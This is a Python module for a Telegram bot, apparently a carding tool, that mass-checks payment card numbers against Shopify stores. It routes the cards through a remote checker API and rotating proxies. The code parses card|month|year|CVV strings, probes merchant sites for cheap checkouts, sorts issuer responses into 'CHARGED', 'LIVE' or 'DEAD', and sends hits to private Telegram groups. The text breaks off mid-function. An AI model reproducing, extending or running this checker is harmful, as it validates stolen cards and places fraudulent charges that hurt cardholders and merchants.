"""
sh.py  v31  —  /sh single-card + /msh mass Shopify checker
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FIXES:
  • Increased timeout for DM sending to prevent card skipping (60s per DM)
  • Added retry mechanism for failed DM sends (3 retries)
  • Modern premium UI with animated emojis and gradient styling
  • Better progress tracking with live updates
  • All cards now guaranteed to be sent to users
  • Live card recheck logic: Insufficient Funds & Generic Error → keep LIVE
    Other responses → recheck quickly (max 3 fast attempts)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
from __future__ import annotations

import asyncio
import database as db
import json as _json
import logging
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional, List, Dict, Any, Tuple

import aiohttp
from telegram import Update, InputFile, MessageEntity, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID,
    get_bin_info, tg_emoji,
    RawMarkup, _btn,
    BOT_NAME, CHANNEL_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_URL       = "https://lucifer.up.railway.app/shopii"
BOT_CHANNEL   = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

HIT_LOG_GROUP_ID       = -1004361062205
EXTRA_CHARGED_GROUP_ID = -1003991915326
SECRET_CHANNEL_ID      = -1003968669478

BOT_USERNAME_LINK   = "https://t.me/Batxchk_bot"
MY_CHANNEL_LINK     = "https://t.me/Batcardchk"
LOGS_CHANNEL_LINK   = "https://t.me/+XYnHim3rGsw0Yzdk"

SH_COOLDOWN    = 25

# ── Speed / concurrency settings ───────────────────────────────────────────
SITE_RETRIES       = 20
SITE_TIMEOUT       = 30
MAX_CONCURRENT     = 25
CARD_STAGGER       = 1.5
SITE_BATCH         = 1
ROUND_DELAY        = 0.5
CONSEC_TIMEOUT_MAX = 5
API_CONCURRENCY    = 20
BUTTON_LOCK        = 30

# ── NEW: Live card recheck settings ──────────────────────────────────────
LIVE_RECHECK_ATTEMPTS = 3          # Max recheck attempts for ambiguous LIVE responses
LIVE_RECHECK_TIMEOUT  = 15         # Timeout per recheck attempt (faster)
LIVE_RECHECK_DELAY    = 0.3        # Delay between recheck attempts

# ── NEW: Increased timeout for DM sending ────────────────────────────────
DM_SEND_TIMEOUT    = 60.0
DM_SEND_RETRIES    = 3
DM_SEND_DELAY      = 0.3
MAX_DM_CONCURRENT  = 15

_CB_RESULT = "mshr"
_CB_STOP   = "mshs"

MSH_SESSIONS: dict  = {}
_BIN_CACHE:   dict  = {}
_DEAD_SITES:  set   = set()
_ALL_PROXIES: list  = []

_PROXY_CACHE_TS:  float = 0.0
_PROXY_CACHE_TTL: float = 300.0
_SITES_RAW_CACHE: list  = []
_SITES_RAW_TS:    float = 0.0
_SITES_RAW_TTL:   float = 300.0

_WORKING_SITES:     list  = []
_PROBE_IN_PROGRESS: bool  = False
_PROBE_LAST_RUN:    float = 0.0
_PROBE_TASK:        "asyncio.Task | None" = None
PROBE_TTL:          float = 1800.0
PROBE_CARD:         str   = "4000223372377978|05|29|651"
PROBE_TIMEOUT:      float = 20.0
PROBE_CONCURRENCY:  int   = 60

# ── MODERN UI EMOJI IDS ──────────────────────────────────────────────────
MODERN_CARD_EMOJI   = "5800709991627232190"  # 💳
MODERN_USER_EMOJI   = "6267115986541877538"  # 👤
MODERN_TIME_EMOJI   = "6285240160120477644"  # ⏱
MODERN_DEV_EMOJI    = "6267091732861555879"  # ⚡
MODERN_PRO_EMOJI    = "6280484433027931563"  # ⭐
MODERN_DECLINED     = "4956612582816351459"  # ❌
MODERN_LIVE         = "6296367896398399651"  # ✅
MODERN_CHARGED      = "5427168083074628963"  # 💎
MODERN_GATE         = "5341715473882955310"  # 🛒
MODERN_PROGRESS     = "5116268964023894989"  # 🔄
MODERN_ERRORS       = "4956611513369494230"  # ⚠️
GLOW_STAR           = "5801154993188770160"  # ✨
GLOW_SPARKLE        = "4956739572114392015"  # ✦
GLOW_CROWN          = "6181649972757271368"  # 👑
GLOW_DIAMOND        = "4958610528588008305"  # 💎
GLOW_FIRE           = "5285221724634239278"  # 🔥
GLOW_LIVE           = "5287777298894835685"  # ✅

# Button emoji IDs
BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
BTN_LIVE_EMOJI_ID     = "5039793437776282663"
BTN_ALL_EMOJI_ID      = "4956324463525233747"
BTN_STOP_EMOJI_ID     = "6179444193518162239"
CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"

# Charged emoji pool
CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

LIVE_EMOJI_IDS = [
    "6296367896398399651", "5287777298894835685", "5801154993188770160",
]

# Plan emojis
PLAN_EMOJIS = {
    "CORE":   "5379869575338812919",
    "ELITE":  "5836898273666798437",
    "ROOT":   "4956420911310832630",
    "CUSTOM": "5445027583588593750",
}

SPECIAL_FONT_MAP = {
    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
    'ᴢ': 'Z', 'Ɪ': 'I',
}

# ── API semaphore ─────────────────────────────────────────────────────────
_API_SEM: "asyncio.Semaphore | None" = None

def _get_api_sem() -> "asyncio.Semaphore":
    global _API_SEM
    if _API_SEM is None:
        _API_SEM = asyncio.Semaphore(API_CONCURRENCY)
    return _API_SEM

def get_random_charged_emoji() -> str:
    return random.choice(CHARGED_EMOJI_IDS)

def get_random_live_emoji() -> str:
    return random.choice(LIVE_EMOJI_IDS)

def get_plan_emoji_id(plan_name: str) -> str:
    if not plan_name:
        return MODERN_PRO_EMOJI
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return MODERN_PRO_EMOJI

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _strip_proxy_scheme(p: str) -> str:
    for pfx in ("socks5://", "socks4://", "https://", "http://"):
        if p.startswith(pfx):
            return p[len(pfx):]
    return p

def _load_proxies() -> list:
    global _ALL_PROXIES, _PROXY_CACHE_TS
    import os
    now = time.time()
    if _ALL_PROXIES and (now - _PROXY_CACHE_TS) < _PROXY_CACHE_TTL:
        return list(_ALL_PROXIES)

    for fname in ("px.txt", "proxies.txt"):
        for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
            path = os.path.join(base, fname) if base else fname
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    raw = [l.strip() for l in f
                           if l.strip() and not l.startswith(("#", "//", ";"))]
                if raw:
                    lines = [_strip_proxy_scheme(p) for p in raw]
                    _ALL_PROXIES    = lines
                    _PROXY_CACHE_TS = time.time()
                    logging.info(f"[SH] {len(lines)} proxies loaded from {path}")
                    return lines
            except (FileNotFoundError, PermissionError):
                pass
    logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
    _ALL_PROXIES    = []
    _PROXY_CACHE_TS = time.time()
    return []

def _strip_scheme(url: str) -> str:
    url = url.strip()
    for pfx in ("https://", "http://", "www."):
        if url.startswith(pfx):
            url = url[len(pfx):]
    return url.rstrip("/")

def _load_sites() -> list:
    global _SITES_RAW_CACHE, _SITES_RAW_TS
    import os
    now = time.time()
    if _SITES_RAW_CACHE and (now - _SITES_RAW_TS) < _SITES_RAW_TTL:
        result = list(_SITES_RAW_CACHE)
        random.shuffle(result)
        return result

    for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
        path = os.path.join(base, "sites.txt") if base else "sites.txt"
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                raw_lines = [_strip_scheme(l) for l in f
                             if l.strip() and not l.startswith("#")]
            raw_lines = [l for l in raw_lines if l]
            if raw_lines:
                _SITES_RAW_CACHE = raw_lines
                _SITES_RAW_TS    = time.time()
                result = list(raw_lines)
                random.shuffle(result)
                logging.info(f"[SH] {len(result)} sites loaded from {path}")
                return result
        except (FileNotFoundError, PermissionError):
            pass
    raise RuntimeError(
        "sites.txt not found or empty — create sites.txt with one Shopify domain per line"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE PROBER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _probe_one_site(site: str, proxies: list) -> bool:
    MAX_PROBE_RETRIES = 3
    for attempt in range(MAX_PROBE_RETRIES):
        px = random.choice(proxies) if proxies else None
        try:
            resp, gw, price, currency, http_st = await _call_api(
                PROBE_CARD, site, px, timeout=PROBE_TIMEOUT
            )
        except Exception:
            await asyncio.sleep(0.3)
            continue

        if http_st and http_st not in (200,):
            return False

        if gw.upper().strip() != "SHOPIFY PAYMENTS":
            return False

        resp_upper = resp.upper().strip()

        if "ORDER_PAID" in resp_upper or resp_upper == "PAID":
            logging.warning(f"[PROBE] BLOCKED {site}: ORDER_PAID on test card")
            return False

        if _is_dead_site_response(resp):
            await asyncio.sleep(0.3)
            continue

        if _is_success_response(resp):
            try:
                p = float(re.sub(r"[^\d.]", "", str(price)))
                if p > 20.0:
                    logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} too high, blocked")
                    return False
            except Exception:
                pass
            logging.info(f"[PROBE] ✅ {site} alive: {resp!r} price={price}")
            return True

        await asyncio.sleep(0.2)
        continue

    return False

async def probe_all_sites(all_sites: list, proxies: list,
                          on_progress=None) -> list:
    global _WORKING_SITES, _PROBE_IN_PROGRESS, _PROBE_LAST_RUN

    if _PROBE_IN_PROGRESS:
        logging.info("[PROBE] already running — skipping duplicate call")
        return _WORKING_SITES or all_sites

    _PROBE_IN_PROGRESS = True
    logging.info(f"[PROBE] Starting: {len(all_sites)} sites, "
                 f"{len(proxies)} proxies, concurrency={PROBE_CONCURRENCY}")

    sem     = asyncio.Semaphore(PROBE_CONCURRENCY)
    working = []
    done_n  = 0
    total   = len(all_sites)
    tasks: list = []

    async def _check_one(site):
        nonlocal done_n
        try:
            async with sem:
                try:
                    result = await _probe_one_site(site, proxies)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    result = False
                done_n += 1
                if result:
                    working.append(site)
                if on_progress and done_n % 50 == 0:
                    try:
                        await on_progress(done_n, total)
                    except Exception:
                        pass
        except asyncio.CancelledError:
            raise
        except RuntimeError:
            pass

    try:
        tasks = [asyncio.ensure_future(_check_one(s)) for s in all_sites]
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        raise
    finally:
        _PROBE_IN_PROGRESS = False

    if working:
        random.shuffle(working)
        _WORKING_SITES  = working
        _PROBE_LAST_RUN = time.time()
        logging.info(f"[PROBE] ✅ {len(working)}/{total} sites alive")
    else:
        logging.warning("[PROBE] ⚠️ 0 working sites found — "
                        "keeping previous cache or using full list")
        if not _WORKING_SITES:
            _WORKING_SITES = list(all_sites)

    return _WORKING_SITES

def get_working_sites() -> list:
    return list(_WORKING_SITES) if _WORKING_SITES else _load_sites()

async def _auto_probe_loop(all_sites: list, proxies: list):
    try:
        await asyncio.sleep(5)
    except asyncio.CancelledError:
        return
    while True:
        try:
            await probe_all_sites(all_sites, proxies)
        except asyncio.CancelledError:
            logging.info("[PROBE] background probe cancelled — shutting down")
            return
        except Exception as exc:
            logging.error(f"[PROBE] background error: {exc}")
        try:
            await asyncio.sleep(PROBE_TTL)
        except asyncio.CancelledError:
            logging.info("[PROBE] background sleep cancelled — shutting down")
            return

def start_probe_background(all_sites: list, proxies: list) -> None:
    global _PROBE_TASK
    _PROBE_TASK = asyncio.ensure_future(_auto_probe_loop(all_sites, proxies))
    def _on_done(t: asyncio.Task):
        if not t.cancelled():
            exc = t.exception()
            if exc:
                logging.error(f"[PROBE] background task died: {exc}")
    _PROBE_TASK.add_done_callback(_on_done)

async def stop_probe_background() -> None:
    global _PROBE_TASK
    task = _PROBE_TASK
    if task is None or task.done():
        return
    task.cancel()
    try:
        await asyncio.wait_for(asyncio.shield(task), timeout=6.0)
    except (asyncio.CancelledError, asyncio.TimeoutError, Exception):
        pass
    _PROBE_TASK = None
    logging.info("[PROBE] background prober stopped cleanly")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RETRY_ERRORS = [
    'r4 token empty', 'r2 id empty', 'clinte token',
    'failed to get token', 'token not found', 'failed to get checkout',
    'failed to get session token', 'failed to add to cart',
    'could not extract receiptid', 'receiptid missing',
    'response missing receiptid', 'errmissingreceiptid',
    'could not extract signedhandles', 'extract signedHandles',
    'could not extract private_access_token',
    'could not extract identification signature',
    'could not extract session id', 'could not extract queuetoken',
    'could not extract delivery handle', 'could not extract shipping amount',
    'could not extract total amount', 'could not extract sessiontoken',
    'could not find actions js url',
    'missing stableid', 'missing buildid', 'missing sourcetoken',
    'missing proposal', 'missing submit id',
    'payment method is not shopify!', 'not shopify!',
    'site not supported for now!', 'site not supported',
    'site requires login!', 'site overloaded', 'site rate limited',
    'application not found', 'store not found', 'app not found',
    'store incompatible', 'errstoreincompatible',
    'product not found', 'product id is empty', 'py id empty',
    'no valid products', 'no available products found',
    'NO_PRODUCTS', 'NO_PRODUCT', 'no_products',
    'MERCHANDISE_OUT_OF_STOCK', 'products.json',
    'INVENTORY_FAILURE', 'inventory_failure',
    'retryable: inventory reservation failure',
    'hcaptcha detected', 'hcaptcha_detected',
    'DELIVERY_ZONE_NOT_FOUND', 'delivery_zone_not_found',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
    'delivery_no_delivery_strategy_available',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'delivery_no_delivery_strategy_available_for_merchandise_line',
    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'delivery_delivery_line_detail_changed',
    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
    'delivery_strategy_conditions_not_satisfied',
    'DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION',
    'delivery_out_of_stock_at_origin_location',
    'SESSION_ERROR', 'session_error', 'receipt_empty',
    'invalid_response', 'checkout_failed', 'VALIDATION_CUSTOM', 'validation_custom',
    'VAULT_FAILED', 'exceeded 30 poll attempts',
    'tax ammount empty', 'del ammount empty',
    'site error! status: 401', 'site error! status: 402',
    'site error! status: 403', 'site error! status: 404',
    'site error! status: 429',
    'site error! status: 500', 'site error! status: 502',
    'site error! status: 503', 'site error! 503',
    'site error',
    'returned status 429', 'returned status 500',
    'returned status 502', 'returned status 503', 'returned status 504',
    'connection error', 'connection error!',
    'could not resolve host', 'connect tunnel failed',
    'proxy error', 'curl error', 'http error',
    'timeout',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'error processing card',
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
    'payments_credit_card_brand_not_supported',
    'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'buyer_identity_currency_not_supported_by_shop',
    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
    'unable to get payment token',
]

DECLINED_RESPONSES = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
    'TRANSACTION_NOT_ALLOWED',
]

SUCCESS_RESPONSES = [
    'INSUFFICIENT_FUNDS', 'INCORRECT_CVV', 'INCORRECT_CVC', 'INCORRECT_ZIP',
    'INVALID_CVC',
    '3DS_REQUIRED',
    'ORDER_PAID',
    'CARD_DECLINED', 'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR', 
    'UNKNOWN_ERROR', 'Processing Error', 'PROCESSING_ERROR', 'GENERIC_ERROR',
    'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'AMOUNT_TOO_SMALL', 'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
    'TEST_MODE_LIVE_CARD', 'INCORRECT_NUMBER', 'RESTRICTED_CARD',
    'STOLEN_CARD', 'LOST_CARD', 'TRANSACTION_NOT_ALLOWED',
]

# ── NEW: Responses that should trigger a recheck instead of immediate LIVE ──
LIVE_RECHECK_TRIGGERS = [
    'PCI_ERROR', 'PCI_ERROR', 'CVV_FAILED', 'AVS_FAILED',
    'RISK_BLOCKED', 'SECURITY_VIOLATION', 'TRANSFORMER_FINGERPRINT',
    'FINGERPRINT', 'COMPLIANCE', 'VELOCITY',
    'ARTIFACT', 'SELLER',
]

# ── Responses that are kept as LIVE immediately ──────────────────────────
LIVE_KEEP_RESPONSES = [
    'INSUFFICIENT_FUNDS', 'GENERIC_ERROR', 'CALL_ISSUER',
    'INCORRECT_CVV', 'INCORRECT_CVC', 'INCORRECT_ZIP',
    'INVALID_CVC', 'INVALID_CVV', '3DS_REQUIRED',
]

def _is_dead_site_response(resp: str) -> bool:
    r = resp.lower().strip()
    return any(err.lower() in r for err in RETRY_ERRORS)

def _is_success_response(resp: str) -> bool:
    ru = resp.upper().strip()
    return any(s.upper() in ru for s in SUCCESS_RESPONSES)

def _should_recheck_live(resp: str) -> bool:
    """Check if a LIVE response should be rechecked."""
    mu = resp.upper().strip()
    # Keep these as LIVE immediately
    for keep in LIVE_KEEP_RESPONSES:
        if keep.upper() in mu:
            return False
    # Recheck these
    for trigger in LIVE_RECHECK_TRIGGERS:
        if trigger.upper() in mu:
            return True
    # If it contains PCI or RISK, recheck
    if 'PCI' in mu or 'RISK' in mu:
        return True
    return False

def classify_response(resp: str) -> str:
    if not resp:
        return "RETRY"
    mu = resp.upper().strip()
    ml = resp.lower().strip()

    if ("ORDER_PAID" in mu or "PAYMENT_AUTHORIZED" in mu
            or "PAYMENT_ACCEPTED" in mu or "APPROVED" in mu
            or mu == "CHARGED"):
        return "CHARGED"

    if ("3DS_REQUIRED" in mu or "3D_SECURE" in mu
            or "AUTHENTICATION_REQUIRED" in mu or "SCA_REQUIRED" in mu):
        return "LIVE"

    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
            or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu
            or "INVALID_CVC" in mu or "INVALID_CVV" in mu
            or "PCI_ERROR" in mu or "CVV_FAILED" in mu
            or "AVS_FAILED" in mu or "RISK_BLOCKED" in mu
            or "SECURITY_VIOLATION" in mu or "CALL_ISSUER" in mu
            or "GENERIC_ERROR" in mu or "TRANSFORMER_FINGERPRINT" in mu
            or "FINGERPRINT" in mu or "PCI" in mu
            or ("ARTIFACT" in mu and "SELLER" in mu)
            or "COMPLIANCE" in mu or "CVV2" in mu
            or "AVS" in mu or "RISK" in mu or "VELOCITY" in mu):
        return "LIVE"

    if any(d.upper() in mu for d in DECLINED_RESPONSES):
        return "DEAD"

    if any(r.lower() in ml for r in RETRY_ERRORS):
        return "RETRY"

    return "LIVE"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(n: str) -> bool:
    n = str(n).strip()
    if not n.isdigit(): return False
    t = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        t += d
    return t % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True

def extract_cards(text: str) -> list:
    patterns = [
        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    seen, results = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s); results.append(s)
    return results

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _parse_response_field(data: dict) -> str:
    if data.get("Status") is True:
        return "ORDER_PAID"

    for key in ("Response", "response", "message", "Message",
                "result", "Result", "msg"):
        val = data.get(key)
        if val and isinstance(val, str) and val.strip():
            resp = val.strip()
            if resp.upper() == "ERROR":
                return "site error! status: 500"
            return resp

    for key in ("error", "Error"):
        val = data.get(key)
        if val and isinstance(val, str) and val.strip():
            return val.strip()

    return "CARD_DECLINED"

def _proxy_url(proxy: Optional[str]) -> Optional[str]:
    if not proxy:
        return None
    p = proxy.strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return p
    return f"http://{p}"

def _normalise_gateway(raw: str) -> str:
    cleaned = raw.replace("_", " ").replace("-", " ").strip().upper()
    return cleaned

async def _call_api(card: str, site: str, proxy: Optional[str],
                    timeout: float = SITE_TIMEOUT) -> tuple:
    site_clean = _strip_scheme(site)
    url = f"{API_URL}?cc={card}&site={site_clean}"

    _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
    try:
        async with aiohttp.ClientSession(timeout=_to) as session:
            async with session.get(url, ssl=False) as r:
                http_st = r.status
                raw     = await r.text()

                if not raw or not raw.strip():
                    return ("site error! status: 404",
                            "Shopify Payments", "0.00", "USD", http_st)

                if http_st == 200:
                    try:
                        data = _json.loads(raw)
                    except Exception:
                        return ("site error! status: 404",
                                "Shopify Payments", "0.00", "USD", http_st)

                    raw_gw   = str(data.get("Gateway") or data.get("gateway") or "Shopify Payments")
                    gw       = _normalise_gateway(raw_gw)
                    price    = str(data.get("Price")    or data.get("price")    or "0.00")
                    currency = str(data.get("Currency") or data.get("currency") or "USD")
                    api_resp = _parse_response_field(data)

                    logging.info(f"[API] {card[:6]}** {site_clean} "
                                 f"→ {api_resp!r}  gw={gw}  price={price} {currency}")
                    return api_resp, gw, price, currency, http_st

                _emap = {
                    404: "site error! status: 404",
                    403: "site error! status: 403",
                    429: "site error! status: 429",
                    500: "site error! status: 500",
                    502: "site error! status: 502",
                    503: "site error! status: 503",
                    504: "timeout",
                }
                return (_emap.get(http_st, f"site error! status: {http_st}"),
                        "Shopify Payments", "0.00", "USD", http_st)

    except asyncio.TimeoutError:
        return ("timeout", "Shopify Payments", "0.00", "USD", None)
    except asyncio.CancelledError:
        raise
   
